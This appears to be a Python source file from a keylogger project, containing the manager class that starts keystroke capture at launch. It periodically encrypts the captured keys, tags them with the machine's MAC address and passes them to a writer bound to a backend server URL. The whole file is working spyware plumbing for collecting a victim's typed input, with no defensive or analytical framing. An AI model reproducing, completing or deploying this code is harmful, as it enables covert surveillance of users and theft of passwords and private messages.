#Librerys
import threading
import datetime
#Clases
from KelogerService import KeyLoggerService
from Writer import Writer
from Encryption import EncryptionClient

#link to server
SERVER_URL = "http://127.0.0.1:5000"

#Manager
class KeyLoggerManager:
    def __init__(self,url,interval=60):
        self.service = KeyLoggerService()
        self.file_writer = Writer(url)
        self.encryptor = EncryptionClient(url)
        self.interval = interval
        self.running = self.service.is_listening
        self.backend_url = url
        self.start()

    def start(self):
        self._schedule_next_write()
        self.service.start_logging()



    def stop(self):
        self.running = False
        self.service.stop_logging()
        self._write_keys_to_file()


    def _schedule_next_write(self):
        print("next save in :",self.interval - int(datetime.datetime.now().strftime('%S')),"sec")
        threading.Timer(self.interval - int(datetime.datetime.now().strftime('%S')), self._write_keys_to_file).start()


    def _write_keys_to_file(self):
        keys = self.service.keylog_list
        self.service.keylog_list = []
        if keys:
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            encrypted_data = self.encryptor.encrypt_text(keys)#מחכים לפרטים משמואל שעובד על ההצפנה

            log_entry = {
                "Date":timestamp,
                "MAC":self.encryptor.MAC,
                "Data":str(encrypted_data)
            }
            print(log_entry)
            self.file_writer.save_manager(log_entry,timestamp)
        self._schedule_next_write()



# if __name__ == "__main__":
#     key = generate_key()
#     encryptor = Encryptor(key)
#     file_writer = FileWriter("keylog.json", encryptor)
#     keylogger_service = KeyLoggerService()
#     manager = KeyLoggerManager(keylogger_service, file_writer,encryptor)
#     manager.start()

manager = KeyLoggerManager(SERVER_URL)
print(manager.service.is_listening)